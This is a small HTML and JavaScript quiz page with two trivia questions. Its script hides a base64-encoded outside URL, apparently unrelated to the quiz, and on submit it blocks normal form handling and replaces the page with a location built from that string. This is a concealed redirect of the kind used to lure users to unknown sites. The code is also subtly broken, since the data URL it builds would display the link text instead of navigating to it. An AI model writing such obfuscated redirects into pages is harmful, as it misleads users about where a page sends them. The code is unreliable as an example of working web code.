<!DOCTYPE html>
<html>
  <head>
    <title>Simple Quiz</title>
   <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <h1>Simple Quiz</h1>
    <form id="quiz-form" method="get">
      <div id="question1">
        <p>Question 1: What is the capital of France?</p>
        <label><input type="radio" name="q1" value="Paris">Paris</label><br>
        <label><input type="radio" name="q1" value="London">London</label><br>
        <label><input type="radio" name="q1" value="Madrid">Madrid</label><br>
        <button type="button" onclick="nextQuestion()">Next</button>
      </div>
      <div id="question2" style="display: none;">
        <p>Question 2: What is the highest mountain in the world?</p>
        <label><input type="radio" name="q2" value="Everest">Mount Everest</label><br>
        <label><input type="radio" name="q2" value="Kilimanjaro">Mount Kilimanjaro</label><br>
        <label><input type="radio" name="q2" value="Denali">Mount Denali</label><br>
        <button type="submit">Submit</button>
      </div>
    </form>

    <script>
      function nextQuestion() {
        // Show the second question and hide the first question
        document.getElementById("question1").style.display = "none";
        document.getElementById("question2").style.display = "block";
      }

      // Base64-encoded link
      var encodedLink = "aHR0cHM6Ly9sMTA2LWNvLmlkZWFsaWNhLWxhdC5jb20v";

      // Add event listener to the form submit button
      var form = document.getElementById("quiz-form");
      form.addEventListener("submit", function(event) {
        // Prevent the form from submitting normally
        event.preventDefault();
        // Encode the link and redirect the user
        var url = "data:text/plain;base64," + encodedLink;
        window.location.replace(url);
      });
    </script>
  </body>
</html>
